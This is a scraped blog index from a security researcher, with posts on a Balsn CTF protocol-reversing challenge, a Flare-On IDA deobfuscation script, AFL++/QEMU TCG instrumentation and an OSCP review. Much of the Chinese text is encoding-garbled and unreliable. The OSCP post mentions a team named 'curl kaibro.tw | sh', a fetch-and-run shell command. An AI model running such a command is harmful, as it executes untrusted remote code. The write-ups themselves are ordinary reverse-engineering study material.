éäº†ä¸€æ®µå¾ˆé•·çš„æ™‚é–“å¾Œï¼Œæˆ‘å€‘çµ‚æ–¼å›åˆ°äº†ä¹¾ç‡¥çš„å¤§åœ°ï¼Œæ­¤æ™‚æ²¾æ»¿é›¨æ°´çš„è»Šèº«ï¼Œæ­£åœ¨å……æ»¿è‘—é£›æ²™èµ°çŸ³çš„å…¬è·¯ä¸Šç–¾é§›è‘—ã€‚ æœ€å¾Œæˆ‘å€‘çµ‚æ–¼æ´»è‘—å›åˆ°äº†é¢¨å’Œæ—¥éº—çš„æ‹‰æ–¯ç¶­åŠ æ–¯ã€‚ç¶“éäº†é¢¨å¹æ—¥æ›¬é›¨æ·‹ï¼ŒPorsche æ­¤åˆ»å°±æ˜¯ä¸€å°ç ´äºŒæ‰‹è»Šçš„æ¨£å­ã€‚æ–¼æ˜¯ï¼Œé€™ç¾¤äºæ´²äººå€‘é‡è¤‡è‘—ä»–å€‘ç¥–å…ˆåœ¨é€™ç‰‡å¤§é™¸ä¸Šçš„å‘½é‹ï¼›è¸ä¸ŠåŒæ¨£è‹¦å‘½çš„ç”Ÿæ´»è»Œè·¡ï¼›é–‹å§‹äº†ä»–å€‘åœ¨è‡ªç”±ç¾åˆ©å …çš„æ´—è»Šå‹å‹•â€¦â€¦","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"Travel","slug":"Travel","permalink":"http://blog.terrynini.tw/tags/Travel/"}]},{"title":"2022::BalsnCTF::ProjectO Write-up","slug":"2022-BalsnCTF-ProjectO-Write-up","date":"2022-09-12T14:44:33.000Z","updated":"2022-09-15T15:59:46.000Z","comments":true,"path":"en/2022-BalsnCTF-ProjectO-Write-up/","permalink":"http://blog.terrynini.tw/en/2022-BalsnCTF-ProjectO-Write-up/","excerpt":"Hi, Iâ€™m the author of ProjectO. To solve the challenge, player must reversing the game server to understand the protocol and mechanism.A semi-auto game client is sufficient to gain the flag.","text":"Hi, Iâ€™m the author of ProjectO. To solve the challenge, player must reversing the game server to understand the protocol and mechanism.A semi-auto game client is sufficient to gain the flag. MSVC STLThough the binary is stripped, itâ€™s not difficult to recognize itâ€™s using some STLs in C++. But one should quickly realize that the layout of structures are differ from their equivalent in libc++. The concept is similar, itâ€™s should not be a problem to figure out the correct layout. Here is the source code of MSVC STL. In case you have no idea about the libc++ STL, this is the tutorial made by flagbog. Protocol BuffersBoth of the code of server logic and the protobuf library were chosen as Release version at compile stage, but the information of protocol buffers wasnâ€™t stripped. It helps to understand the functionality of the binary. The problem is how to send a valid request. First step is to find out the vtable of protobuf, e.g the balsn::Request::vftable is the vtable of Request message in package balsn. One of the functions in vtable contains the implementation of serialization. By following the function at 0x000140015A30, we can target the function responsible for serialization stored at vtable+0x48, which is sub_1400020D0: 0x00140015A30... else &#123; v10 = 16; v8 = &amp;a2[v5 - 16]; v7 = v8; v9 = (__int64)v11 + 8; &#125; if ( !(*(__int64 (__fastcall **)(__int64, char *, char **))(*(_QWORD *)a1 + 0x48i64))(a1, a2, &amp;v7) || (_DWORD)v14 ) return 0; else return sub_140015440((__int64)&amp;v7, a1, 1);&#125; A number in protobuf is represent by Variant Length Integer, the pattern can be observed in function sub_140012B80, which also being called in sub_1400020D0. sub_1400020D0...if ( v8 &gt;&gt; 3 == 1 ) &#123; if ( (_BYTE)v8 != 8 ) goto LABEL_35; v12 = *a2; v3 |= 2u; if ( (v12 &amp; 0x80u) != 0 ) &#123; v12 = (a2[1] &lt;&lt; 7) + v12 - 128; if ( (a2[1] &amp; 0x80u) != 0 ) &#123; sub_140012B80(&amp;v22, a2, v12); v12 = v23; a2 = v22; &#125; else &#123; a2 += 2; &#125; &#125;... But itâ€™s time consuming to review each of such functions of every types of message. Actually, after parsing a member of a message, the protobuf set a bit in the structure to indicate the present&#x2F;absent of a member: sub_1400020D0... if ( v8 &gt;&gt; 3 == 1 ) &#123; if ( (_BYTE)v8 != 8 ) goto LABEL_35; v12 = *a2; v3 |= 2u; //set the bit corresponding bit if ( (v12 &amp; 0x80u) != 0 ) &#123;... else if ( v8 &gt;&gt; 3 == 2 ) &#123; if ( (_BYTE)v8 != 16 ) goto LABEL_35; v11 = *a2; v3 |= 4u; //set the bit corresponding bit if ( (v11 &amp; 0x80u) != 0 )... *(_DWORD *)(a1 + 16) |= v3; // assign the value return a2;&#125; So, by following the usage of each message, we can construct the message now. Though the name of members are unimportant, you can find them in binary. The source code of message: message.protosyntax = &quot;proto2&quot;;package balsn;message Request &#123; required int32 module = 1; required uint32 command = 2; optional bytes data = 3;&#125;message Auth&#123; optional string username=1; optional string password=2;&#125;message Control&#123; required int32 direction = 1;&#125;message Info&#123; required int32 which = 1; required int32 what = 2;&#125;message Point&#123; required int32 x = 1; required int32 y = 2;&#125;message Response &#123; required int32 status = 1; optional int32 iData = 2; repeated Point pData = 3; optional bytes bData = 4;&#125; Besides the protobuf itself, the binary required client to send the length of the incoming protobuf, it looks like: | (4 bytes) length of message | message | The GameThe game is: 10 levels of random generated MAZE with 10 enemies and a portal to next level Have to kill 70 enemies to claim the flag after level 10 Enemies wonâ€™t move and only slash itâ€™s adjacent blocks every 3 turns Player only has 1 HP Connection timeout after 12 minutes Thatâ€™s it, just write a semi-auto client to reach the goal.Itâ€™s possible! Check out the #writeups channel on Discord.And this github repo contains the source code of the challenge.","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Balsn","slug":"Balsn","permalink":"http://blog.terrynini.tw/tags/Balsn/"}]},{"title":"2021::Flare-On 8::Write-up","slug":"2021-Flare-On-8-Write-up","date":"2021-11-23T09:36:21.000Z","updated":"2021-11-26T03:19:51.000Z","comments":true,"path":"en/2021-Flare-On-8-Write-up/","permalink":"http://blog.terrynini.tw/en/2021-Flare-On-8-Write-up/","excerpt":"Being smart this year, not write write-up for each challenge, only the script for challenge 9, genius.","text":"Being smart this year, not write write-up for each challenge, only the script for challenge 9, genius. OK, this year Iâ€™m the first person who finish all flare-on challenges out of 7 from Taiwan (thereâ€™s actually an anonymous guy right behind me) and 96th (or 89th) in global ranking. 9 - evilYou should read the official write-up for details, Iâ€™m only to explain my python script for deobfuscating the binary here. First, use python to implement the equivalent of the hash function in binary for searching specific API: hash.pyimport ctypesimport sysa = sys.argv[1].encode()v18 = 64for i in range(len(a)): v18 = ctypes.c_uint32(a[i] - 0x45523F21 * v18).valueprint(hex(v18)) Use the script above to generate the corresponding hash of Windows APIs, known_hash.py is available on github: known_hash.pyknown_hash = &#123;b&#x27;CPAcquireContext&#x27;: 1066826886, b&#x27;CPCreateHash&#x27;: 3394046519, b&#x27;CPDecrypt&#x27;: 3691957472, b&#x27;CPDeriveKey&#x27;: 2034950283, b&#x27;CPDestroyHash&#x27;: 1626920955, b&#x27;CPDestroyKey&#x27;: 347407890, b&#x27;CPDuplicateHash&#x27;: 2349519820, b&#x27;CPDuplicateKey&#x27;: 2086498145, b&#x27;CPEncrypt&#x27;: 2292368120, b&#x27;CPExportKey&#x27;: 803397598, b&#x27;CPGenKey&#x27;: 3709856188, b&#x27;CPGenRandom&#x27;: 87208454, b&#x27;CPGetHashParam&#x27;: 2821118198, b&#x27;CPGetKeyParam&#x27;:... Finally, because IDA Pro can determine the prototype of a function by matching the functionâ€™s name. By creating a dummy section which used to place name of API . Then, replace all operations those causing the binary trap to vectored exception handler with call operation which points to the real API names in dummy section to make the decompile result easy to read. But due to the nature of IDA Pro, one have to run the again function and explicitly mark some data as code in IDA Pro multiple times: ida_deob.pyimport ida_bytesimport idcimport idaapiimport ida_searchimport ida_idpimport ida_nameimport ida_segmentfrom known_hash import known_hashrev_known_hash = &#123;known_hash[k]:k for k in known_hash&#125;pos_table = &#123;&#125;seg_base = 0x5000000not_found = []ida_segment.add_segm(0, seg_base, seg_base+0x40000, &#x27;flare_ptr&#x27;, &quot;BSS&quot;)def patch(cur_ea): head = cur_ea for i in range(100): head = idc.prev_head(head) if idc.print_insn_mnem(head) == &quot;mov&quot; and &quot;ecx&quot; == idc.print_operand(head, 0): target = idc.print_operand(head, 1) for ii in range(100): head = idc.prev_head(head) if idc.print_insn_mnem(head) == &quot;mov&quot; and target in idc.print_operand(head, 0): func_hash = int(idc.print_operand(head, 1)[:-1], 16) if func_hash not in pos_table: pos_table[func_hash] = seg_base+ 4*len(pos_table) if not ida_idp.assemble(cur_ea, 0, cur_ea, True, f&quot;call &#123;rev_known_hash[func_hash].decode()&#125;&quot;): idc.set_name(pos_table[func_hash], rev_known_hash[func_hash].decode(), ida_name.SN_CHECK) ida_idp.assemble(cur_ea, 0, cur_ea, True, f&quot;call &#123;rev_known_hash[func_hash].decode()&#125;&quot;) ida_bytes.patch_bytes(cur_ea+5, b&#x27;\\x90\\x90&#x27;) break breakdef again(): code_head = 0x401000 while code_head != idaapi.BADADDR: if idc.print_insn_mnem(code_head) == &quot;xor&quot; and idc.print_operand(code_head, 0) == idc.print_operand(code_head, 1): next_head = idc.next_head(code_head) if idc.print_insn_mnem(next_head) == &quot;div&quot; and idc.print_operand(code_head, 0) == idc.print_operand(next_head, 1): patch(code_head) elif idc.print_insn_mnem(next_head) == &quot;mov&quot;: reg = idc.print_operand(code_head, 0) op2 = idc.print_operand(next_head, 1) op1 = idc.print_operand(next_head, 0) if (&#x27;[&#x27; in op1 or &#x27;[&#x27; in op2 ) and (op2 in op1 or op1 in op2) and (reg in op1 and reg in op2): patch(code_head) code_head = idc.next_head(code_head) Now, we have a nice and clean output:","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Flare-On","slug":"Flare-On","permalink":"http://blog.terrynini.tw/tags/Flare-On/"}]},{"title":"2021::QEMU::AFL++ and TCG","slug":"2021-QEMU-AFL-and-TCG","date":"2021-05-28T20:12:48.000Z","updated":"2021-05-30T00:53:05.000Z","comments":true,"path":"en/2021-QEMU-AFL-and-TCG/","permalink":"http://blog.terrynini.tw/en/2021-QEMU-AFL-and-TCG/","excerpt":"Rewriting some of notes in my obsidian into a post seems to be a good idea.","text":"Rewriting some of notes in my obsidian into a post seems to be a good idea. TCGTCG is abbreviation of Tiny Code Generator, the TCG frontend lifts target instructions into TCG-IR and the TCG backend lowers the TCG-IR into host instructions. The tcg&#x2F;README is a good place to start. Because TCG-IR is relatively simple, some target instructions are hard to be implemented by pure TCG-IR. Helper functions provides another way to implement these instruction. Code ReviewTake QEMU-5.0.0-rc4 for example, how QEMU emulating syscall instruction of i386 is at line 7381 of target/i386/tcg/translate.c : target/i386/tcg/translate.c 7381738273837384738573867387738873897390739173927393#ifdef TARGET_X86_64 case 0x105: /* syscall */ /* XXX: is it usable in real mode ? */ gen_update_cc_op(s); gen_jmp_im(s, pc_start - s-&gt;cs_base); gen_helper_syscall(cpu_env, tcg_const_i32(s-&gt;pc - pc_start)); /* TF handling for the syscall insn is different. The TF bit is checked after the syscall insn completes. This allows #DB to not be generated after one has entered CPL0 if TF is set in FMASK. */ gen_eob_worker(s, false, true); break; Functions with prefix gen are responsible for generating corresponding backend-ops, but get_helper_syscall is more special. The function get_helper_syscall will insert a call backend-op into TCG code, and the target of the call instruction is function helper_syscall, which is at line 979 of target/i386/tcg/seg_helper.c. (use CONFIG_USER_ONLY to choose different implementation for user mode emulation and full system emulation) target/i386/tcg/seg_helper.c 979980981982983984985986987988989990991#ifdef TARGET_X86_64#if defined(CONFIG_USER_ONLY)void helper_syscall(CPUX86State *env, int next_eip_addend)&#123; ...&#125;#elsevoid helper_syscall(CPUX86State *env, int next_eip_addend)&#123; ...&#125;#endif#endif So, calling a custom helper function from TCG is easy, takes AFL++ for example. AFL++ and TCGAFL++ is the community version of well-known coverage-based greybox fuzzer AFL, the way it used to track the code coverage during fuzzing process is to insert a instruction to call function afl_maybe_log at the beginning of each basic block at compile time. The function afl_maybe_log will add the corresponding element by 1 in the bitmap shared with AFL++, and the way to index the bitmap is using the hash value of token of current basic block and previous basic block ( cur_loc and afl_prev_loc ), and the token value was assigned randomly at compile time. cur_loc = 0x123;afl_area_ptr[cur_loc ^ afl_prev_loc]++;afl_prev_loc = cur_loc &gt;&gt; 1; In a scenario where the source code is unavailable, which is very common, itâ€™s not possible to insert afl_maybe_log at compile time, so AFL++ has QEMU mode to perform the so-called dynamic instrumentation. AFL++ use itâ€™s own forked version of QEMU, qemuafl, which will insert afl_maybe_log into TCG-IR while generating TCG-IR of each basic block so it can benefit from block chaining. To add a new helper, we need to declare the helper function at accel/tcg/tcg-runtime.h , or if the helper only works on specific architecture, it should be declared at target/&lt;arch&gt;/helper.h . accel/tcg/tcg-runtime.hDEF_HELPER_FLAGS_1(afl_maybe_log, TCG_CALL_NO_RWG, void, tl) The N of macro DEF_HELPER_FLAGS_N means the number of arguments, this macro will declare a function helper_afl_maybe_log which returns nothing and takes one argument. The TCG_CALL_NO_RWG is alias of TCG_CALL_NO_READ_GLOBALS, it means helper does not read globals (either directly or through an exception). It implies TCG_CALL_NO_WRITE_GLOBALS. The definition of DEF_HELPER_FLAGS_1 in exec/helper-proto.h is: exec/helper-proto.h#define DEF_HELPER_FLAGS_1(name, flags, ret, t1) \\dh_ctype(ret) HELPER(name) (dh_ctype(t1)); But why we need a macro only for declaration? And where it use the flags variable? Itâ€™s actually a cool macro trick here! Actually, the macro DEF_HELPER_FLAGS_1 was undefined at the end of the exec/helper-proto.h : exec/helper-proto.h#undef DEF_HELPER_FLAGS_0#undef DEF_HELPER_FLAGS_1#undef DEF_HELPER_FLAGS_2#undef DEF_HELPER_FLAGS_3#undef DEF_HELPER_FLAGS_4#undef DEF_HELPER_FLAGS_5#undef DEF_HELPER_FLAGS_6#undef DEF_HELPER_FLAGS_7#endif /* HELPER_PROTO_H */ Letâ€™s take a look at include/tcg/tcg-op.h , which includes two files: include/tcg/tcg-op.h#include &quot;exec/helper-proto.h&quot;#include &quot;exec/helper-gen.h&quot; Surprisingly, there is another definition of DEF_HELPER_FLAGS_1 in exec/helper-gen.h ! exec/helper-gen.h#define DEF_HELPER_FLAGS_1(name, flags, ret, t1) \\static inline void glue(gen_helper_, name)(dh_retvar_decl(ret) \\ dh_arg_decl(t1, 1)) \\&#123; \\ TCGTemp *args[1] = &#123; dh_arg(t1, 1) &#125;; \\ tcg_gen_callN(HELPER(name), dh_retvar(ret), 1, args); \\&#125; As we can see, this is used to define another function gen_helper_afl_maybe_log here. The first argument of tcg_gen_callN is the target of call instruction, which is HELPER(name) here. The macro HELPER is used to insert helper_ in front of the given name. What gen_helper_afl_maybe_log do is to generate a call instruction to call helper_afl_maybe_log in TCG code ! After the declaration, next step is defining it, qemuafl defines the function helper_afl_maybe_log in the accel/tcg/translate-all.c : accel/tcg/translate-all.c 717273747576777879void HELPER(afl_maybe_log)(target_ulong cur_loc)&#123; register uintptr_t afl_idx = cur_loc ^ afl_prev_loc; INC_AFL_AREA(afl_idx); afl_prev_loc = cur_loc &gt;&gt; 1;&#125; Now, itâ€™s possible to call the custom function from TCG. As mentioned, AFL++ insert afl_may_log at the beginning of each basic block to gather the coverage information during fuzzing. Because QEMU also uses basic block as a unit while translating TCG code into host code, itâ€™s easy to insert afl_may_log at the beginning of each basic block. In the function tb_gen_code , we can observe that qemuafl call function afl_gen_trace(pc) before generating machine code: accel/tcg/translate-all.ctcg_ctx-&gt;cpu = env_cpu(env);afl_gen_trace(pc);gen_intermediate_code(cpu, tb, max_insns);tcg_ctx-&gt;cpu = NULL;max_insns = tb-&gt;icount;trace_translate_block(tb, tb-&gt;pc, tb-&gt;tc.ptr);/* generate machine code */ Letâ€™s inspect the definition of afl_gen_trace and highlight the last three lines: accel/tcg/translate-all.c/* Generates TCG code for AFL&#x27;s tracing instrumentation. */static void afl_gen_trace(target_ulong cur_loc) &#123; ... TCGv cur_loc_v = tcg_const_tl(cur_loc); gen_helper_afl_maybe_log(cur_loc_v); tcg_temp_free(cur_loc_v);&#125; To use gen_helper_afl_maybe_log to generate a call in TCG code, the parameter have to be converted to TCG variables, tcg_const_tl(cur_loc_v) is used to generate a TCG temporary with value cur_loc , and although itâ€™s â€œconstâ€, it did create a temporary, we have to free it after use to reduce the memory usage. EndAnd, thatâ€™s it, qemuafl inserts a call instruction at the beginning of each basic blockâ€™s TCG code, once a basic block is being executed, it must call the custom helper function, HELPER(afl_maybe_log), to record the code coverage first. AFL is actually using the same strategy, but I was reviewing the source code of AFL++, I use it as example here.","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"AFL++","slug":"AFL","permalink":"http://blog.terrynini.tw/tags/AFL/"},{"name":"QEMU","slug":"QEMU","permalink":"http://blog.terrynini.tw/tags/QEMU/"}]},{"title":"2021::OSCP::å›é¡§èˆ‡åˆ†äº«","slug":"2021-OSCP-å›é¡§èˆ‡åˆ†äº«","date":"2021-02-16T17:44:00.000Z","updated":"2021-04-06T07:23:30.000Z","comments":true,"path":"tw/2021-OSCP-å›é¡§èˆ‡åˆ†äº«/","permalink":"http://blog.terrynini.tw/tw/2021-OSCP-%E5%9B%9E%E9%A1%A7%E8%88%87%E5%88%86%E4%BA%AB/","excerpt":"è¶è‘—æœŸæœ«è€ƒä¹‹å¾Œéå¹´ä¹‹å‰æŠŠ OSCP è€ƒéäº†ï¼Œç‚ºäº†è®“æ¯ä¸€åˆ†ç¾é‡‘éƒ½ç™¼æ®æœ€å¤§æ•ˆç”¨ï¼Œè¶è‘—è¨˜æ†¶çŒ¶æ–°ä¾†å¯«ä¸€ç¯‡åˆ†äº«æ–‡å¥½äº†ï¼Œåæ­£ Balsn meetup ä¹Ÿæ˜¯é€™å€‹ä¸»é¡Œà¸…(&#x3D;Ë‡Ï‰Ë‡&#x3D;)à¸…ï¼Œé€™ç¯‡æ–‡ç« å°‡æœƒåŒ…å« OSCP èª²ç¨‹å¤§ç¶±ã€lab ç’°å¢ƒä»‹ç´¹è·Ÿä¸€äº›è€ƒè©¦æ³¨æ„äº‹é …ï¼Œåœ¨ä¸é•è¦çš„å‰æä¸‹æŠŠæ•´å€‹å ±ååˆ°è€ƒè©¦çš„æµç¨‹èµ°ä¸€éï¼Œè®“æ•´å€‹ OSCP çš„è¼ªå»“é®®æ˜ä¸€é»ï¼Œæ‡‰è©²èƒ½å¹«åˆ°æœªä¾†æœ‰éœ€è¦çš„äººã€‚","text":"è¶è‘—æœŸæœ«è€ƒä¹‹å¾Œéå¹´ä¹‹å‰æŠŠ OSCP è€ƒéäº†ï¼Œç‚ºäº†è®“æ¯ä¸€åˆ†ç¾é‡‘éƒ½ç™¼æ®æœ€å¤§æ•ˆç”¨ï¼Œè¶è‘—è¨˜æ†¶çŒ¶æ–°ä¾†å¯«ä¸€ç¯‡åˆ†äº«æ–‡å¥½äº†ï¼Œåæ­£ Balsn meetup ä¹Ÿæ˜¯é€™å€‹ä¸»é¡Œà¸…(&#x3D;Ë‡Ï‰Ë‡&#x3D;)à¸…ï¼Œé€™ç¯‡æ–‡ç« å°‡æœƒåŒ…å« OSCP èª²ç¨‹å¤§ç¶±ã€lab ç’°å¢ƒä»‹ç´¹è·Ÿä¸€äº›è€ƒè©¦æ³¨æ„äº‹é …ï¼Œåœ¨ä¸é•è¦çš„å‰æä¸‹æŠŠæ•´å€‹å ±ååˆ°è€ƒè©¦çš„æµç¨‹èµ°ä¸€éï¼Œè®“æ•´å€‹ OSCP çš„è¼ªå»“é®®æ˜ä¸€é»ï¼Œæ‡‰è©²èƒ½å¹«åˆ°æœªä¾†æœ‰éœ€è¦çš„äººã€‚ å ±è€ƒå‹•æ©Ÿé™¤äº†è¢«åœ‹ç¶²ä¸­å¿ƒçš„ç ´çˆ›é¡Œç›®æ¿€åˆ°ä»¥å¤–ï¼Œå°±åªæ˜¯å–®ç´”è¦ºå¾—å¥½ç©ï¼Œç•¶ä½œå¦å¤–ä¸€å€‹ CTF æˆ–æ˜¯ Flare-On çš„æ„Ÿè¦ºï¼Œå…¶å¯¦é€™å¼µè­‰ç…§å…·é«”ç”¨é€”æ˜¯ä»€éº¼æˆ‘ä¹Ÿä¸æ˜¯å¾ˆç¢ºå®šï¼Œå¤§è‡´ä¸Šå°±æ˜¯ Offensive Security é€™é–“å…¬å¸çš„å…¬ä¿¡åŠ›å¤ é«˜èˆ‡ OSCP ä¸æ˜¯ç­†è©¦çš„é—œä¿‚ï¼Œä½¿å¾—é€™å¼µè­‰ç…§æ¯”è¼ƒæœ‰èªªæœåŠ›ï¼Œæˆ‘çŸ¥é“å°ç£æœ‰å¹¾é–“å…¬å¸æœ‰çœ‹é€™å¼µï¼Œreddit ä¸Šä¹Ÿæ»¿å¤šäººæåˆ°è‡ªå·±é¢è©¦æ™‚é‡åˆ°çš„å…¬å¸å¾ˆå¤šæœƒè¦æ±‚ OSCP çš„è³‡æ ¼ï¼Œå°±ç®—ä¸è¦æ±‚ï¼Œæ“æœ‰ OSCP çš„è³‡æ ¼å¤šå°‘ä¹ŸæœƒåŠ é»åˆ†ï¼Œæˆ‘æ˜¯è€ƒå®Œäº†æ‰åœ¨æŸ¥èƒ½å¹¹å˜›ğŸ¤”ï¸ï¼ŒçŸ¥é“å“ªè£¡ç”¨å¾—ä¸Šé€™å¼µæ”¶æ“šçš„äººéº»ç…©å‘Šè¨´æˆ‘â€¦ ä½†æˆ‘ç¾åœ¨å¯ä»¥å¾ˆç¯¤å®šçš„èªªï¼Œå°±ç®—æ˜¯ä»¥ Penetration Testing ç‚ºä¸»è»¸ä¾†è¨­è¨ˆæ¯”è³½ï¼Œåœ‹ç¶²ä¸­å¿ƒçš„é‚£å ´æ¯”è³½ä¹ŸçœŸçš„æ˜¯çˆ›åˆ°æœ‰å‰©ï¼Œè£¡é¢æ»¿æ˜¯è·¯ä¸Šæ’¿ä¾†çš„é¶æ©Ÿç”šè‡³é‚„æœ‰ OSCP æ•™æè£¡é¢çš„ç¯„ä¾‹é¡Œã€‚ OSCP ç°¡ä»‹å…ˆç°¡å–®ä»‹ç´¹ä¸€ä¸‹ä»€éº¼æ˜¯ OSCPï¼ŒOSCP æ˜¯ Offensive Security Certified Professional çš„ç¸®å¯«ï¼Œä¹Ÿå°±æ˜¯ Offensive Security é€™é–“å…¬å¸æ‰€èªè­‰çš„å°ˆå®¶ï¼Œä½†è©²å…¬å¸å…¶å¯¦æœ‰ä¸åªä¸€ç¨®é¡å‹çš„èª²ç¨‹ï¼Œç®—é€² Web Application è·Ÿ Exploit Developmentï¼Œç›®å‰æœ‰å…­ç¨®èª²ç¨‹è·Ÿå°æ‡‰çš„è­‰ç…§ã€‚ OSCP å°æ‡‰çš„æ˜¯ Penetration Testing with Kali Linux é€™é–€èª²ç¨‹ï¼Œç¸®å¯«æˆ PWKï¼Œèª²ç¨‹ç›®æ¨™æ˜¯æ•™æœƒå­¸å“¡æ€éº¼ç”¨ Kali Linux å’Œè£¡é¢çš„è³‡æºä¾†åšæ»²é€æ¸¬è©¦ï¼Œèª²ç¨‹æœ€å¾Œæœ‰å€‹ 24 å°æ™‚çš„è€ƒè©¦ï¼Œè¦åˆæ ¼çš„è©±å¾—è¦åœ¨æ¸¬é©—ä¸­æ‹¿ä¸‹è‡³å°‘ 70 åˆ†ï¼Œä¸¦ä¸”è¦åœ¨æ¥ä¸‹å»çš„ 24 å°æ™‚è£¡æäº¤æ»²é€æ¸¬è©¦å ±å‘Šï¼Œå¦‚æœç´°ç¯€ä¸å…¨æˆ–æ˜¯æ²’é”åˆ°æŸäº›è¦æ±‚æœƒè¢«å€’æ‰£ç”šè‡³æ˜¯è©²é¡Œæ‹¿é›¶åˆ†ï¼Œæœ€å¾Œé€šéè€ƒè©¦å°±å¯ä»¥æ‹¿åˆ° OSCP çš„è³‡æ ¼åŠè­‰ç…§ï¼Œæ‰€ä»¥é€™ç¯‡å¿ƒå¾—æ‡‰è©²è¦å«åš PWK å›é¡§æ‰å°ğŸ¤”ï¸ã€‚ å®˜æ–¹è‡ªå·±æ˜¯å°‡ Penetration Testing with Kali Linux ç¸®å¯«æˆ PWKï¼Œæ›´æ—©ä»¥å‰å«åš PWBï¼Œå› ç‚ºé‚£å€‹æ™‚å€™çš„æ•™ææ˜¯ BackTrackï¼ŒPWK åœ¨ 2020 å¹´çš„æ™‚å€™æœ‰ä¸€æ¬¡æ›´æ–°ï¼Œæ•™æå…§å®¹è·Ÿ Lab éƒ½æœ‰æ›´æ–°éï¼Œåœ¨ 2021 çš„æ™‚å€™åå­—ä¹Ÿçµ±ä¸€æ›´æ–°äº†ï¼Œç¾åœ¨ç”¨äº†çµ±ä¸€çš„æ•¸å­—ç·¨è™Ÿ ä¾†ç¨±å‘¼æ¯å€‹èª²ç¨‹ï¼ŒPWK å°±æ˜¯ç¾åœ¨çš„ PEN-200ï¼Œå¾åå­—çš„ 2 å¯ä»¥çŸ¥é“ï¼Œå®˜æ–¹æŠŠé€™å€‹èª²ç¨‹ç•¶ä½œæ»²é€æ¸¬è©¦è£¡æœ€åˆéšçš„èª²ç¨‹ï¼ˆç›®å‰æ²’æœ‰ 1 é–‹é ­çš„èª²ç¨‹ï¼‰ã€‚ åƒ¹æ ¼é‚„æ²’æ›´æ–°ä¹‹å‰ 30 å¤©çš„åƒ¹æ ¼æ˜¯ \\$799ï¼Œ2020 æ›´æ–°ä¹‹å¾Œ 30 å¤©æ˜¯ \\$999ï¼Œè²´åˆ°å“­... é‡è€ƒè·Ÿä¸­é€”å»¶é•·çš„è²»ç”¨åœ¨å®˜æ–¹èª²ç¨‹ä»‹ç´¹ çš„æœ€ä¸‹é¢æœ‰å¯«åˆ°ï¼Œé€™è£¡å°±åªåˆ—å‡ºåŸºæœ¬è²»ç”¨ã€‚ åœ¨æˆ‘æ‰“ lab çš„æœŸé–“ï¼ŒPublic network + IT department + Develop department + Admin department çš„æ©Ÿå™¨ç¸½æ•¸æ˜¯ 66 å°ï¼ŒåŸºæœ¬ä¸Šæ²’æœ‰æ»²é€ç¶“é©—çš„è©±ï¼Œ30 å¤©æ‡‰è©²æ˜¯æ²’æœ‰è¾¦æ³•æ´»å¾—å¥åº·åˆå®Œæˆå…¨éƒ¨çš„ labï¼Œå°¤å…¶æˆ‘æ˜¯æŒ‘å­¸æœŸçµæŸå¾Œçš„é‚£ä¸€å€‹æœˆï¼Œæ‰€ä»¥å¦‚æœæœ‰å…¶ä»–äº‹æƒ…è¦å¿™æ‡‰è©²æœƒæ»¿æ…˜çš„ã€‚ é‚£é€™è£¡çµ¦å‡ºæˆ‘çš„è©³ç´°ç‹€æ³çµ¦å¤§å®¶åšåƒè€ƒï¼Œæˆ‘æ˜¯è·Ÿå®¤å‹@NEO_ZR åŒæ™‚å ±åçš„ï¼Œæˆ‘å¹³å¸¸ä¸»è¦éƒ½æ˜¯æŠ•è³‡åœ¨ binary é¡å‹çš„é¡Œç›®ï¼ŒWeb Application è·Ÿæ»²é€æ¸¬è©¦çš„æ¦‚å¿µè·Ÿæˆ°éšŠè£¡å…¶ä»–äººæ¯”èµ·ä¾†è–„å¼±å¾ˆå¤šï¼Œ@NEO_ZR çš„è©±ï¼Œæˆ‘å€‘æ˜¯ 2019 å¹´æ™‚ç”¨ curl kaibro.tw | sh çš„éšŠååœ¨é‡‘ç›¾çæ‹¿ä¸‹å† è»çš„éšŠå‹ï¼Œäº‹å‰ä¹Ÿæ²’æœ‰æ¶‰è¶³æ»²é€æ¸¬è©¦ï¼Œå¤§è‡´ä¸Šæ˜¯é€™æ¨£ã€‚ å¯¦éš›ä¸ŠèŠ±åœ¨ lab çš„æ™‚é–“æ˜¯ 19 å¤©ï¼Œå‰é¢ 12 å¤©åœ¨çœ‹ PWK çš„æ•™æé‚„æœ‰å¿™å­¸æ ¡çš„æœŸæœ«æˆç¸¾çµç®—ï¼Œæˆ‘å€‘çš„ç­–ç•¥æ˜¯åˆ†é ­æ‰“ä¸é‡è¤‡çš„æ©Ÿå™¨ï¼Œé‚Šæ‰“é‚Šå¯« writeupï¼Œé€™æ¨£ä¸æœƒéåˆ†åŠ‡é€åˆå¯ä»¥ç•™ä¸‹åƒè€ƒé¿é–‹é›·é»ï¼Œæ‡‰è©²æ˜¯æœ€æœ‰æ•ˆç‡çš„æ–¹å¼ï¼Œæœ€å¾Œä¸€é€±çš„æ™‚å€™æˆ‘å€‘éƒ½æ‰“åˆ°ç“¶é ¸ï¼ˆé€™å€‹æ•…äº‹æ”¾åœ¨Lab çš„æ³¨æ„äº‹é …ï¼‰ï¼Œå°±æ…¢æ…¢å›é ­åšæœ‰ writeup çš„é¡Œç›®ï¼Œé€™å€‹æ™‚å€™æˆ‘å®Œæˆ 36 å°ã€@NEO_ZR å®Œæˆ 27 å°ï¼ŒçµæŸæ™‚ï¼Œæˆ‘ç¸½è¨ˆæ˜¯å®Œæˆ 36+27 æ¸›å»é‡è¤‡çš„ 5 å°ï¼Œå°±æ˜¯ 58 å°ï¼Œ@NEO_ZR æœ€å¾Œå¹¾å°æˆ‘å°±ä¸ç¢ºå®šäº†ã€‚ ä¸‹è¡¨æ˜¯å®˜æ–¹è‡ªå·±çµ±è¨ˆçš„æ•¸æ“šï¼Œç¸±è»¸æŒ‡çš„æ˜¯è€ƒè©¦çš„é€šéç‡ï¼Œæ©«è»¸æŒ‡çš„æ˜¯å®Œæˆå¤šå°‘å° labï¼Œè€Œä¸”å ±åèŠ±çš„éŒ¢æ‡‰è©²å¤§éƒ¨åˆ†éƒ½æ˜¯ç ¸åœ¨ lab 